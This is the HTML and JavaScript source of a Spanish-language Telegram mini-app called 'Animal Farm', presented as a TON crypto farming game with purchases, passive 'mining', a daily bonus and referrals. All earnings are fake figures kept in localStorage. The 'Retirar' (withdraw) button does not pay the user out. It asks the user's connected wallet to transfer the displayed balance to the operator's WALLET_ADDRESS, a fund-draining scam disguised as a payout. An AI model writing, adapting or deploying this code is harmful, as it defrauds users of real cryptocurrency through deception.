<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Animal Farm</title>

  <!-- Telegram -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>

  <!-- TON Connect -->
  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(#87CEEB, #c2f0c2);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }
.farm-bg {
      position: fixed;
      inset: 0;
      z-index: -1;
      background: url('farm.jpg') repeat-x bottom/contain;
      animation: moveFarm 60s linear infinite;
      opacity: 0.9;
    }

    h1 { margin-top: 20px; }

    .balance { font-size: 22px; margin: 6px 0; }

    .grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 14px;
      width: 90%;
      max-width: 800px;
      margin-top: 20px;
    }

    .card {
      background: rgba(0,0,0,0.6);
      border-radius: 16px;
      padding: 14px;
      text-align: center;
    }

    .card img { width: 80px; height: 80px; }

    button {
      margin-top: 10px;
      padding: 10px 14px;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
    }

    .panel {
      margin-top: 20px;
      background: rgba(0,0,0,0.6);
      padding: 16px;
      border-radius: 14px;
      text-align: center;
    }

    .ref-box {
      margin-top: 10px;
      font-size: 13px;
      word-break: break-all;
      cursor: pointer;
      color: #ffd166;
    }
  </style>
</head>

<body>

<h1>üêæ Animal Farm</h1>

<div id="ton-connect"></div>

<div class="balance">Balance: <span id="balance">0</span> TON</div>
<div class="balance">Producci√≥n/seg: <span id="perSec">0</span> TON</div>

<div class="grid" id="shop"></div>

<div class="panel">
  <div>Total ganado: <span id="earned">0</span> TON</div>
  <div>Referidos: <span id="refs">0</span></div>

  <div id="refLink" class="ref-box"></div>

  <button onclick="withdraw()">üí∏ Retirar</button><br><br>
  <button onclick="claimBonus()">üéÅ Bonus diario</button>
</div>

<script>
/* ========= CONFIGURACI√ìN ========= */

const BOT_USERNAME = "TU_BOT";        // ‚Üê CAMBIAR
const WALLET_ADDRESS = "TU_WALLET";   // ‚Üê CAMBIAR

const tg = window.Telegram.WebApp;
tg.expand();

/* ========= TON CONNECT ========= */

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
  manifestUrl: "https://canva-web-herramienta.github.io/Animal-Farm/tonconnect-manifest.json",
  buttonRootId: "ton-connect"
});

/* ========= ANIMALES ========= */

const animals = [
  { name: "Gallo", price: 3, production: 0.1, img: "https://images.emojiterra.com/google/noto-emoji/unicode-16.0/color/svg/1f413.svg" },
  { name: "Oveja", price: 10, production: 0.4, img: "https://cdn-icons-png.flaticon.com/512/1998/1998610.png" },
  { name: "Perro", price: 20, production: 1, img: "https://cdn-icons-png.flaticon.com/512/616/616430.png" },
  { name: "Gato", price: 30, production: 1.5, img: "https://cdn-icons-png.flaticon.com/512/616/616408.png" }
];

/* ========= DATOS ========= */

let balance = Number(localStorage.getItem("balance")) || 0;
let earned  = Number(localStorage.getItem("earned"))  || 0;
let owned   = JSON.parse(localStorage.getItem("owned")) || [0,0,0,0];
let refs    = Number(localStorage.getItem("refs")) || 0;

/* ========= REFERIDOS TELEGRAM ========= */

const ref = tg.initDataUnsafe?.start_param;

if (ref && !localStorage.getItem("refUsed")) {
  localStorage.setItem("refUsed", ref);
  refs++;
}

const myRef = localStorage.getItem("myRef") || Math.random().toString(36).substring(2,10);
localStorage.setItem("myRef", myRef);

const refLink = `https://t.me/${BOT_USERNAME}?startapp=${myRef}`;

const refBox = document.getElementById("refLink");
refBox.innerHTML = `Tu link de referido:<br>${refLink}<br><small>(toca para copiar)</small>`;

refBox.onclick = () => {
  navigator.clipboard.writeText(refLink);
  alert("Link copiado üìã");
};

/* ========= UI ========= */

const balanceEl = document.getElementById("balance");
const perSecEl  = document.getElementById("perSec");
const earnedEl  = document.getElementById("earned");
const refsEl    = document.getElementById("refs");
const shopEl    = document.getElementById("shop");

function save(){
  localStorage.setItem("balance", balance);
  localStorage.setItem("earned", earned);
  localStorage.setItem("owned", JSON.stringify(owned));
  localStorage.setItem("refs", refs);
}

function calcPerSec(){
  let perDay = animals.reduce((s,a,i)=> s + a.production * owned[i],0);
  return perDay / 86400;
}

function updateUI(){
  balanceEl.textContent = balance.toFixed(4);
  perSecEl.textContent  = calcPerSec().toFixed(6);
  earnedEl.textContent  = earned.toFixed(4);
  refsEl.textContent    = refs;
}

/* ========= COMPRAR ========= */

function buy(i){
  if(balance >= animals[i].price){
    balance -= animals[i].price;
    owned[i]++;
    save();
    updateUI();
    location.reload();
  }
}

/* ========= RETIRO TON ========= */

async function withdraw(){
  if(balance < 1) return alert("M√≠nimo retiro: 1 TON");

  const tx = {
    validUntil: Math.floor(Date.now()/1000) + 300,
    messages: [{
      address: WALLET_ADDRESS,
      amount: (balance * 1e9).toString()
    }]
  };

  try {
    await tonConnectUI.sendTransaction(tx);
    balance = 0;
    save();
    updateUI();
    alert("Retiro enviado üöÄ");
  } catch {
    alert("Error en retiro");
  }
}

/* ========= BONUS ========= */

function claimBonus(){
  const last = Number(localStorage.getItem("bonus")) || 0;
  const now = Date.now();

  if(now - last > 86400000){
    balance += 0.5;
    localStorage.setItem("bonus", now);
    save();
    updateUI();
    alert("Ganaste 0.5 TON üéâ");
  } else {
    alert("Bonus ya reclamado hoy");
  }
}

/* ========= TIENDA ========= */

function renderShop(){
  animals.forEach((a,i)=>{
    const card = document.createElement("div");
    card.className = "card";
    card.innerHTML = `
      <img src="${a.img}">
      <h3>${a.name}</h3>
      <p>Precio: ${a.price} TON</p>
      <p>Producci√≥n: ${a.production} TON/d√≠a</p>
      <p>Tienes: ${owned[i]}</p>
      <button onclick="buy(${i})">Comprar</button>
    `;
    shopEl.appendChild(card);
  });
}

/* ========= MINADO ========= */

setInterval(()=>{
  const gain = calcPerSec();
  balance += gain;
  earned  += gain;
  save();
  updateUI();
}, 1000);

/* ========= INIT ========= */

renderShop();
updateUI();
</script>

</body>
</html>

